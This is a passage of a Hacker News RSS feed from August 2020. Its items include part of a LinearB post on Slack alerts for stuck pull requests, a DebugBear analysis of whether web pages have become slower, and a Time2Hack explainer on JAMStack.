					<div>
							<figure>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.53.45-PM.png.webp 1222w" sizes="(max-width: 1222px) 100vw, 1222px">
<img width="1222" height="354" src="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.53.45-PM.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.53.45-PM.png 1222w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.53.45-PM-300x87.png 300w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.53.45-PM-1024x297.png 1024w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.53.45-PM-768x222.png 768w" sizes="(max-width: 1222px) 100vw, 1222px">
</picture>
											<figcaption>LinearB Slack Alert, Pull Request merged without review</figcaption>
										</figure>
					</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="8cebaf9" data-element_type="section">
						<div>
				<div>
				<div data-id="9f85135" data-element_type="column">
			<div>
					<div>
				<div data-id="5f1d3a9" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
							<figure>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.54.29-PM.png.webp 1264w" sizes="(max-width: 1264px) 100vw, 1264px">
<img width="1264" height="338" src="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.54.29-PM.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.54.29-PM.png 1264w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.54.29-PM-300x80.png 300w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.54.29-PM-1024x274.png 1024w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.54.29-PM-768x205.png 768w" sizes="(max-width: 1264px) 100vw, 1264px">
</picture>
											<figcaption>LinearB Work-at-risk  Slack Alert</figcaption>
										</figure>
					</div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="fb858d6" data-element_type="section">
						<div>
				<div>
				<div data-id="a1ed9f5" data-element_type="column">
			<div>
					<div>
				<div data-id="7abae44" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>These preemptive notifications allow engineers to open a discussion about the work before it’s a problem. Earlier discovery almost always saves time during the iteration. Automated Slack alerts for these high risk actions also improve the way your teams work. By calling out high risk actions like Pull Request merged without review, it brings focus to detrimental behavior. Once it’s identified, it can be improved upon.&nbsp;</span></p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="bf826ec" data-element_type="section">
						<div>
				<div>
				<div data-id="c314480" data-element_type="column">
			<div>
					<div>
				<div data-id="4b9f666" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span><strong>Stuck Work</strong>&nbsp;</span></p><p><span>Notifying the team about work that has stagnated in your pipeline increases team efficiency and helps give a voice to shy or distributed developers. </span></p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="243c555" data-element_type="section">
						<div>
				<div>
				<div data-id="6ddeb40" data-element_type="column">
			<div>
					<div>
				<div data-id="e1deb15" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Top Development-level Slack alerts for stuck work include:&nbsp;</span></p>
<ul>
<li><span>PR is waiting for review (Review Request Pending)</span></li>
<li><span>High interaction review&nbsp;</span></li>
<li><span>Review Not Merged (Long Review Detected)</span></li>
</ul></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="b3a64a7" data-element_type="section">
						<div>
				<div>
				<div data-id="e6e8696" data-element_type="column">
			<div>
					<div>
				<div data-id="3f44d4d" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
							<figure>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-1.01.55-PM.png.webp 1136w" sizes="(max-width: 1136px) 100vw, 1136px">
<img width="1136" height="336" src="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-1.01.55-PM.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-1.01.55-PM.png 1136w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-1.01.55-PM-300x89.png 300w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-1.01.55-PM-1024x303.png 1024w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-1.01.55-PM-768x227.png 768w" sizes="(max-width: 1136px) 100vw, 1136px">
</picture>
											<figcaption>LinearB Slack Alert, Review request hanging</figcaption>
										</figure>
					</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="0603a68" data-element_type="section">
						<div>
				<div>
				<div data-id="20c8ce8" data-element_type="column">
			<div>
					<div>
				<div data-id="e498bd8" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
							<figure>
										<picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.55.17-PM.png.webp 1216w" sizes="(max-width: 1216px) 100vw, 1216px">
<img width="1216" height="354" src="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.55.17-PM.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.55.17-PM.png 1216w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.55.17-PM-300x87.png 300w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.55.17-PM-1024x298.png 1024w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-20-at-12.55.17-PM-768x224.png 768w" sizes="(max-width: 1216px) 100vw, 1216px">
</picture>
											<figcaption>LinearB Slack Alert, Long Review</figcaption>
										</figure>
					</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="727da78" data-element_type="section">
						<div>
				<div>
				<div data-id="e6d063b" data-element_type="column">
			<div>
					<div>
				<div data-id="aa7bf47" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Back when we were working in an office, if someone issued a PR and no one picked it up for review within the week, they would have to bring it up during synchronous communication periods like stand-up, lunch, or interrupting someone’s work. Now that everyone is distributed, it can be even more challenging to identify stuck work in our development process, or know when I’m not interrupting anyone. Slack alerts are an easy asynchronous way to communicate when something needs attention without someone having to personally reach out, or wait until the next stand up — which could be 20 hours away.&nbsp;</span></p>

<p><span>The other major pros to asynchronous stuck work slack alerts are using them to balance teamwork and drive discussions. Asking someone to drop what they are doing to follow-up on your request is bad form. An alert however can be read when someone is taking a break and picked up by whoever has time.&nbsp;</span></p>

<p><span>These alerts also provide an opportunity to have a focused Slack or Zoom discussion that may not have been otherwise had. Giving developers the chance to provide context around the alert is an easy way to make sure your devs are being heard, as well as learn how you can best support your teammates.&nbsp;</span></p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="198b3aa" data-element_type="section">
						<div>
				<div>
				<div data-id="2f194b3" data-element_type="column">
			<div>
					<div>
				<div data-id="4100a0e" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>The Future of Software Development Slack Alerts </h2>		</p>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="59e22c6" data-element_type="section">
						<div>
				<div>
				<div data-id="1d4cc60" data-element_type="column">
			<div>
					<div>
				<div data-id="89512b9" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><span>At LinearB, we’ve worked hard to provide development teams with all of the Slack alerts I mentioned above. Our risk and stuck work alerts have changed the way my team works and I hope they will help yours as well. With that in mind, we are focused on the continued development of even smarter alerts…and …</span></p></div></div></div></div></div></div></div></section></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linearb.io/blog/slack-alerts-for-software-development-teams/">https://linearb.io/blog/slack-alerts-for-software-development-teams/</a></em></p>]]>
            </description>
            <link>https://linearb.io/blog/slack-alerts-for-software-development-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261545</guid>
            <pubDate>Mon, 24 Aug 2020 15:24:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to conduct penetration testing and vulnerability assessment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24261541">thread link</a>) | @somizero
<br/>
August 24, 2020 | https://www.jobportals.net/2020/08/i-will-conduct-penetration-testing-and.html | <a href="https://web.archive.org/web/*/https://www.jobportals.net/2020/08/i-will-conduct-penetration-testing-and.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.jobportals.net/2020/08/i-will-conduct-penetration-testing-and.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261541</guid>
            <pubDate>Mon, 24 Aug 2020 15:24:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is the Web Getting Slower?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261529">thread link</a>) | @mostlystatic
<br/>
August 24, 2020 | https://www.debugbear.com/blog/is-the-web-getting-slower | <a href="https://web.archive.org/web/*/https://www.debugbear.com/blog/is-the-web-getting-slower">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>
    <div>
    
      
      

      

      <div>
        
        

        <p>A story on Hacker News recently argued that webpage speeds haven't improved, even as internet speeds have gone up.</p>
<p>This article explains why that conclusion can't be drawn from the original data.</p>
<p>We'll also look at how devices and the web have changed over the past 10 years, and what those changes have meant for web performance.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/hn-article.png" alt="Webpage speeds article on Hacker News"></p>
<ol>
<li><a href="#interpreting-the-http-archive-data">Interpreting the HTTP Archive data</a></li>
<li><a href="#how-have-mobile-networks-and-devices-changed-over-the-last-10-years">How have mobile networks and devices changed over the last 10 years?</a></li>
<li><a href="#how-have-websites-changed">How have websites changed?</a></li>
<li><a href="#data-from-the-chrome-user-experience-report">Data from the Chrome User Experience Report</a></li>
<li><a href="#modelling-page-load-times">Modelling page load times</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<h2 id="interpreting-the-http-archive-data">Interpreting the HTTP Archive data</h2>
<p>This chart from the <a href="https://www.nngroup.com/articles/the-need-for-speed/">Nielsen Norman Group article</a> suggested that increasing mobile network bandwidth hasn't resulted in faster page load times.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/nngroup-mobile-webperf-chart.png" alt="Chart showing increasing bandwidth along increasing page load times"></p>
<p>However, <strong>the connection speed used by HTTP Archive has not actually increased over time.</strong></p>
<p>Instead it went down in 2013, <a href="https://httparchive.org/faq#what-changes-have-been-made-to-the-test-environment-that-might-affect-the-data">switching from wifi to an emulated 3G connection</a>.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/nngroup-mobile-webperf-chart-annotated.png" alt="Annotation for page loads time showing when methodology changed"></p>
<p>The onLoad metric has increased 55% since 2013, from 12.7s to 19.7s. If you bought a phone in 2013 and have been on a 3G connection ever since, then the web has become slower for you.</p>
<p>Before looking at how devices and the web have changed over the last 10 years, here are a few notes on how to think about this data.</p>
<h3 id="why-look-at-on-load">Why look at onLoad?</h3>
<p>The <code>load</code> event is emitted by the page when all page resources like scripts or images have been downloaded.</p>
<p>If the top of a page renders quickly, but the page also loads 20 images further down, then the onLoad metric will suggest that the page is slow.</p>
<p>A different page might not initially render anything useful at all, and only start loading additional resources and rendering content long after the onLoad event. Yet this page will appear fast.</p>
<p>As a result, onLoad doesn't do a good job measuring whether a user experiences the page as fast.</p>
<p>So why do we even look at this metric? <strong>Because it's been around for a long time</strong>, and HTTP Archive has been tracking it since 2010. Newer metrics like <a href="https://www.debugbear.com/docs/metrics/first-contentful-paint">First Contentful Paint</a> or Time to Interactive were only added to HTTP Archive in 2017.</p>
<h3 id="should-we-expect-increasing-bandwidth-to-result-in-faster-page-load-times">Should we expect increasing bandwidth to result in faster page load times?</h3>
<p>Increasing bandwidth will only make a page load faster if bandwidth is the bottleneck at some point. It won't help if you're on a Gigabit connection with a 1s network roundtrip time.</p>
<p>However, the 1.6Mbps 3G connection emulated by HTTP Archive is very slow, so we should expect significant performance improvements as bandwidth improves. The average website downloads 1.7MB of data in 2020, which will take at least 9s to download on the HTTP Archive connection.</p>
<h3 id="some-more-http-archive-caveats">Some more HTTP Archive caveats</h3>
<p>I'll talk a lot about "the average website" in this article. It's worth noting that HTTP Archive only collects data on homepages, not pages deeper down in the site. The corpus of tested domains has also grown over time.</p>
<p>The tests weren't always run on the same device. Initially a physical iPhone 4 was used, today the tests are run on an emulated Android device.</p>
<p>We'll look at median metric values in this article. If most websites are fast but one in five websites freeze your phone for 20s we won't be able to pick this up.</p>
<h3 id="performance-on-desktop">Performance on desktop</h3>
<p>This article will focus on mobile performance in the US. However, if you're looking at the desktop data from the original article, it's worth noting that the test bandwidth was increased and latency was reduced in 2013.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/desktop-performance.png" alt="Chart showing desktop connection speeds and when emulated connection speed changed"></p>
<h2 id="how-have-mobile-networks-and-devices-changed-over-the-last-10-years">How have mobile networks and devices changed over the last 10 years?</h2>
<p>Let's look at 4 factors:</p>
<ul>
<li>network bandwidth</li>
<li>network latency</li>
<li>processor speeds</li>
<li>browser performance</li>
</ul>
<h3 id="mobile-network-bandwidth-in-the-us">Mobile network bandwidth in the US</h3>
<p>This chart shows average mobile bandwidth in the US by year, according to different sources. It increased from 1 Mbps to around 30 Mbps.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/us-mobile-bandwidth.png" alt="Mobile bandwidth in the US by year"></p>
<p>(I've not been very careful when collecting this data. For example, I didn't consistently distinguish when data was collected from when it was published. <a href="https://docs.google.com/spreadsheets/d/1ifZ_ngADpT3YzezNQLpXKCsr74-BvaBJUkYm6PGpv1g/edit?usp=sharing">You can find my sources here</a>.)</p>
<h3 id="mobile-network-latency-in-the-us">Mobile network latency in the US</h3>
<p>This was harder to find data on, but the results indicate that latency dropped from around 200ms in 2011 to 50ms in 2020.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/us-mobile-latency.png" alt="Mobile latency in the US by year, going down from 200ms in 2011 to 50ms in 2020"></p>
<h3 id="mobile-device-cpu-speeds">Mobile device CPU speeds</h3>
<p>I've not been able to find data on average mobile device speeds in the US. But <a href="https://infrequently.org/">Alex Russel</a> and <a href="https://surma.dev/">Surma</a> have published a <a href="https://twitter.com/slightlylate/status/1233275220275818498">chart showing GeekBench 4 scores alongside the release years of different phones</a>.</p>
<p>Even budget phones have become 4x faster, with iPhones now being up to 20x more powerful.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/mobile-cpu-benchmark.jpeg" alt="Mobile CPU performance over time"></p>
<h3 id="how-have-browsers-changed">How have browsers changed?</h3>
<p>A lot of work has been done on browsers over the last 10 years. JavaScript has become a larger part of the web, so many improvements have focussed here.</p>
<p>Looking at <a href="https://v8.dev/blog/10-years">this chart from the V8 blog</a>, page CPU usage for gone down by a factor of 4.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/v8-performance.png" alt="V8 Speedometer 1 benchmark results 2013 to 2018"></p>
<h4 id="networking">Networking</h4>
<p>Browser networking has also improved, for example with the introduction of HTTP/2 in 2015. 64% of requests are now served over HTTP/2.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/http2.png" alt="HTTP/2 adoption over time"></p>
<h2 id="how-have-websites-changed">How have websites changed?</h2>
<p>Let's look at some data from HTTP Archive to see how websites have changed.</p>
<h3 id="page-weight">Page weight</h3>
<p><a href="https://httparchive.org/reports/page-weight">Mobile page weight</a> increased by 337% between 2013 and 2020. This is primarily driven by an increase in images and JavaScript code.</p>
<p>Other resources also increased a lot –&nbsp;I suspect these are mostly videos.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/page-weight.png" alt="Page weight by resource type over time"></p>
<p>The chart starts in 2013 as HTTP Archive changed its methodology in October 2012. Before page weight was undercounted, as the test stopped when the page load event was triggered, even if more data was still being loaded.</p>
<h3 id="java-script-execution-time">JavaScript execution time</h3>
<p>JavaScript would be the most likely culprit if pages are getting slower despite faster mobile networks. Unfortunately, HTTP Archive only started collecting this data in late 2017, and it seems to have been mostly stable since then.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/javascript-execution-time.png" alt="HTTP Archive JavaScript execution time chart"></p>
<p>The drop in mid-2018 can probably be attributed to a URL corpus change.</p>
<p>Note that the absolute run duration (0.5s) is less than what you'd normally see in a tool like Lighthouse. These tools normally slow down JavaScript execution to emulate a mobile device, but <a href="https://almanac.httparchive.org/en/2019/methodology#lighthouse">this was broken for the HTTP Archive tests</a>. So while this number might be realistic for mid-range phones, a common assumption is that budget phones are around 4x slower.</p>
<h2 id="answering-whether-the-web-has-become-slower">Answering whether the web has become slower</h2>
<p>Has the web become slower? Well, it depends on what your device, network connection, and most-used websites are.</p>
<p>We'd need to weigh real-world performance data to get a distribution that shows how different users experienced the web over time. And should the experience of someone opening thousands of pages a day count as much as someone who only visits Facebook once a week?</p>
<p>I don't have detailed per-user data, but we can take a look at the question in a few different ways:</p>
<ol>
<li>Real-user data from the <a href="https://developers.google.com/web/tools/chrome-user-experience-report">Chrome UX Report (CrUX)</a></li>
<li>Naive modelling based on how websites and devices have changed</li>
</ol>
<p>I also tried downloading old page versions from archive.org and testing them with Lighthouse, but wasn't able to get meaningful results in the time I had available. For example, often some images are missing from the page archive.</p>
<h2 id="data-from-the-chrome-user-experience-report">Data from the Chrome User Experience Report</h2>
<p>The big limitation of CrUX data is that it's only been collected since late 2017. But we can still use it to see if the web has become slower in the last two and a half years.</p>
<p>Note that, unlike HTTP Archive, CrUX looks at the whole domain instead of just homepages.</p>
<p>The data we'll look at is the 75th percentile, meaning pages load at least this fast for 75% of users.</p>
<p>(I'm taking the average across websites rather than the median, which is not great.)</p>
<h3 id="us-page-load-times">US page load times</h3>
<p>CrUX data for the US does not show page performance getting worse.</p>
<p>The onLoad metric shows a slight improvement, maybe due to an increase in bandwidth. Or maybe more activity is now happening after the initial page load.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/crux-us.png" alt="Page load speeds in the US"></p>
<p>The paint metrics seem fairly stable. Largest Contentful Paint is a new metric that has only been collected since mid-2019.</p>
<h3 id="the-rest-of-the-world">The rest of the world</h3>
<p>The downward trend in the US onLoad metric is matched by the global data. There are however signifianct differences in page load times across countries, with onLoad timings in India being almost twice those in South Korea.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/crux-global.png" alt="Page load speeds globally, in the US, UK, Korea, and India"></p>
<p>We can use CrUX data to put HTTP Archive data into perspective. In January 2020 HTTP Archive reported a median (50% percentile) load time of 18.7s, based on its synthetic data.</p>
<p>In contrast, CrUX suggests a load time of just 5.8s –&nbsp;and this is the 75th percentile.</p>
<p>(Note that the Global values here just take an average and are not weighed by population.)</p>
<h2 id="modelling-page-load-times">Modelling page load times</h2>
<p>We can create a theoretical model of how changes in devices, networks, and websites might affect overall performance.</p>
<p>This won't be a great model, but hopefully it will still provide some insight.</p>
<h3 id="theoretical-page-download-time">Theoretical page download time</h3>
<p>Page weight has increased over time, but so has bandwidth. Round-trip latency has also gone down.</p>
<p>Downloading a file the size of the median mobile website would have taken 1.7s in 2013. If your connection hasn't improved since then downloading this much data would now take 4.4s. But with an average connection today it would only take 0.9s.</p>
<p><img src="https://www.debugbear.com/public/blog/is-the-web-getting-slower/minimum-page-download-time.png" alt="TCP download time"></p>
<p>In practice, a website wouldn't consist of just a single request, and other factors like CPU processing or server latency would also affect how quickly the page loads. The onLoad times reported by HTTP Archive are 2-3 times this lower bound.</p>
<p>But we can still use this as an indicator that reduced latency and increased bandwidth have helped make websites load faster overall.</p>
<p>(I'm starting in 2013 rather than 2011, as the HTTP Archive page weight metric has only been measured consistently since then.)</p>
<h3 id="cpu">CPU</h3>
<p>I'm not quite sure how to think about this, but I'll make some guesses anyway.</p>
<p>Someone who used a Galaxy S4 in 2013 and now uses a Galaxy S10 will have seen their CPU processing power go up by a factor of 5. Let's assume that browsers have become 4x more efficient since then. If we naively multiply these numbers we get an overall 20x improvement.</p>
<p>Since 2013, JavaScript page weight has increased 3.7x from 107KB to 392KB. Maybe minification and compression have improved a bit …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.debugbear.com/blog/is-the-web-getting-slower">https://www.debugbear.com/blog/is-the-web-getting-slower</a></em></p>]]>
            </description>
            <link>https://www.debugbear.com/blog/is-the-web-getting-slower</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261529</guid>
            <pubDate>Mon, 24 Aug 2020 15:23:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is JAMStack?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24261220">thread link</a>) | @patelpankaj
<br/>
August 24, 2020 | https://time2hack.com/what-is-jam-stack-why-you-should-care/ | <a href="https://web.archive.org/web/*/https://time2hack.com/what-is-jam-stack-why-you-should-care/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<p>JAMStack or JavaScript, APIs and Markup Stack is a modern shift in the FrontEnd Space to develop fast web applications.</p><p>JAMStack has been around for a while, though recent developments in SSG (Static Site Generators) has pushed JAM Stack to be one of the favourite Stack Choice.</p><hr><h2 id="what-is-jamstack">What is JAMStack?</h2><p>JAMStack is a stack (duh), workflow and way to build websites where dynamic behaviour is provided by <strong><u>J</u>avaScript</strong>, Data is fed only via <strong><u>A</u>PIs</strong> and <strong><u>M</u>arkup</strong> provides the necessary structure/placeholder for the content which is static or dynamic.</p><blockquote><strong>The main idea is that the Static Markup will always be faster than the dynamically generated markup from Server</strong></blockquote><p>So we will serve the static content at first and use JavaScript to add dynamic content through API.</p><p>One very common sidestep is SSR, Server Side Rendering, where for the Dynamic Content, we generate the Static Pages beforehand and deploy them. When a Client request for the Page, we will deliver the static content and Data to re-link the page's JavaScript with Markup.</p><p>The final render will be non-noticeable change from SSR HTML to JavaScript Generated Components.</p><p>And if the JS Renderer is intelligent enough, there will not be any change to the DOM itself. Many Front End Libraries and Frameworks are doing so with the help of Virtual DOM (vDOM) and applying only the diff of vDOM &amp; actual DOM.</p><h3 id="benefits">Benefits</h3><ul><li><strong>Ultra Fast</strong>; as content generation step is removed, so is the time to do so. The requested pages can be delivered as soon as the server finds the content to deliver.</li><li><strong>Low Server Cost</strong>; Server Cost is low as we not spending Server time and resources on building the markup dynamically.</li><li><strong>Backends For Frontend (BFF)</strong>; Now backend can only focus on serving the needs of the front end with APIs rather than spending energy on caring about the response markup generation.<p>Hence Backend will only exist to satisfy FrontEnd needs. This also means Backend Teams can focus on solving problems at the API level.</p><p>Serving static content is gonna be primarily handled at DevOps level.</p></li><li><strong>Better Caching</strong>; As the static content is less likely to change, the caching can be more extensive to speed up the Content Delivery. The age of cached content can be longer.</li><li><strong>Leverage CDN</strong>; CDN (Content Delivery Networks) can be leveraged to deliver the static markup as well; not just the media files</li></ul><h3 id="problems">Problems</h3><p>As there are shiny benefits; there are some problems as well that need to be addressed when choosing to go with JAM stack. Problems like:</p><ul><li><strong>TTI or Time to Interactive</strong>; Longer <a href="https://web.dev/tti/">TTI</a>s can be a huge pain if the JS is not performant or not bundled in an optimized way</li><li><strong>Optimization is at Discretion</strong>; The JavaScript and CSS delivery need to be optimized and there are tools to do this automatically but Developers' discretion is heavily required.</li><li><strong>JS Parsing Overhead</strong>; As all the dynamicity is moved to JS, User would have to wait for JS make the page functional and ready to use and parsing time of JS is another bottleneck.<p>Hence JS delivered to clients should be optimized, small in size and should only contain the pieces which will be needed immediately.</p></li><li><strong>SEO</strong>; SEO is not a big problem as the Crawlers can execute the necessary JS; though it is an extra step for crawlers to execute. SSR and HTML Snapshots can fix this problem but this is an extra step for the build of the site.</li></ul><hr><h2 id="why-should-you-care">Why should you care?</h2><p>As a developer, no matter which part of Application you are working on, you have to be aware of the Stack you are using or you are going to use.</p><h3 id="as-frontend-developer">As Frontend Developer</h3><p>As a frontend developer, JAM stack brings a majority of the application responsibilities to you. You might need to be aware of the DevOps of the application as well</p><h3 id="as-backend-developer">As Backend Developer</h3><p>As we discussed above, JAM stack promotes BFF (Backend For Frontend) for application development.</p><p>This means that API hardening is much more essential. Security, Access, Authorization etc becomes highly important.</p><p>The backend can be developed as a monolith or microservice, but this detail of implementation is none of the Frontend's concern. It up to you how you break the application down and when you do it.</p><h3 id="as-fullstack-developer">As Fullstack Developer</h3><p>Well, everything written above for Frontend and Backend is your concern now. You might also have to be more aware of System Architecture and DevOps for smooth development and execution of the application.</p><p>As the idea of DevOps as code is being favoured more and more by developers and DevOps engineers; you are kind of a One-Man Army in JAM Stack.</p><hr><h2 id="when-to-say-no-to-jamstack">When to say "<em>No!"</em> to JAMStack?</h2><p>No matter how shiny it is, sometimes JAM stack is an over-engineering practice as a solution to application design.</p><p>You can try to ask yourself the following questions to see if JAMStack is a right fit for your application design:</p><ul><li>How important it is to have an ultra-fast web application</li><li>Does your team have independent Frontend and Backend Developer?</li><li>How often the dynamic part of your application changes?</li></ul><figure><img src="https://res.cloudinary.com/time2hack/image/upload/q_auto:good,f_auto/what-is-jam-stack-why-you-should-care-Comparision.png" alt=""></figure><ul><li>Can you spend on multiple servers and CDN service? And how much?</li><li>and many more...</li></ul><hr><h2 id="how-to-jamstack">How to <em>"JAMStack"</em>?</h2><p>Like we discussed in the beginning, JAMStack has three major parts</p><ul><li>JavaScript</li><li>APIs</li><li>Markup</li></ul><p>Markup is always HTML and JavaScript is always going to be there to add interactivity to HTML.</p><p>APIs are a whole different challenge in themselves; though for JAMStack; let's consider that the APIs are in place and follow the majority of the best practices.</p><p>Now the question is about the tools and development workflow.</p><p>Major tools can be put in the brackets of:</p><h3 id="ssg-static-site-generators-">SSG (Static Site Generators)</h3><p>SSGs are the tools responsible for the generation of Static Page and that's where the name comes from. Some commonly used Generators are:</p><ul><li><a href="https://www.gatsbyjs.org/">Gatsby</a></li><li><a href="https://nextjs.org/">Next.js</a></li><li><a href="https://github.com/react-static/react-static">React Static</a></li><li><a href="https://www.11ty.dev/">11ty</a></li><li><a href="https://nuxtjs.org/">Nuxt</a></li><li><a href="https://vuepress.vuejs.org/">VuePress</a></li><li>More generators at <a href="https://www.staticgen.com/">https://www.staticgen.com/</a></li></ul><hr><h3 id="build-and-deployment">Build and Deployment</h3><p>Build and Deployment sections are also known as CI (Continuous Integration) and CD (Continuous Deployment). This is where above-mentioned SSGs will execute and generate the Pages and publish them to the designated host.</p><p>You can find a guide to <a href="https://www.time2hack.com/host-your-static-site-on-gitlab-pages/">host your static site for free here</a> and <a href="https://www.time2hack.com/ways-to-host-single-page-application-spa-static-site-for-free/">here</a></p><p>Popular CI/CD Tools in the market you can choose from:</p><ul><li><a href="https://www.netlify.com/">Netlify</a></li><li><a href="https://vercel.com/">Vercel (now.sh)</a></li><li><a href="https://github.com/features/actions">Github Actions</a></li><li><a href="https://about.gitlab.com/stages-devops-lifecycle/continuous-integration/">Gitlab CI/CD</a></li><li><a href="https://bitbucket.org/product/features/pipelines">BitBucket pipelines</a></li></ul><hr><h3 id="cms-content-management-system-">CMS (Content Management System)</h3><p>CMSes are the place where we will manage the Content. This is not necessary for all the JAM Stack Sites, though the sites where API is for content, choice of CMS is a crucial part.</p><p>For CMSes to play well with the JAM Stack, they should be able to execute in a Headless Manner. Some of the popular choices are:</p><ul><li><a href="https://www.contentful.com/">Contentful</a></li><li><a href="https://ghost.org/">Ghost</a></li><li><a href="https://www.netlifycms.org/">Netlify CMS</a></li><li><a href="https://wordpress.com/">Wordpress (Headless Mode)</a></li><li>More headless CMSes at <a href="https://headlesscms.org/">https://headlesscms.org/</a></li></ul><hr><h2 id="conclusion">Conclusion</h2><p>JAMStack is very fast when done properly. And there are so many choices to make to build a fast solution with JAMStack.</p><p><strong><em>What is your JAMStack?</em></strong></p><p>Let me know through comments 💬 or on Twitter at &nbsp;<a href="https://twitter.com/patel_pankaj_">@patel_pankaj_</a> &nbsp;and/or &nbsp;<a href="https://twitter.com/time2hack">@time2hack</a></p><p>If you find this article helpful, please share it with others 🗣</p><p>Subscribe to the blog to receive new posts right to your inbox.</p>

<ins data-ad-client="ca-pub-1830015441649630" data-ad-slot="3501574357" data-ad-format="auto" data-full-width-responsive="true"></ins>

</section></div>]]>
            </description>
            <link>https://time2hack.com/what-is-jam-stack-why-you-should-care/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261220</guid>
            <pubDate>Mon, 24 Aug 2020 14:50:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google says ‘Incognito Mode’ does not mean ‘invisible’]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24261208">thread link</a>) | @vvpvijay
<br/>
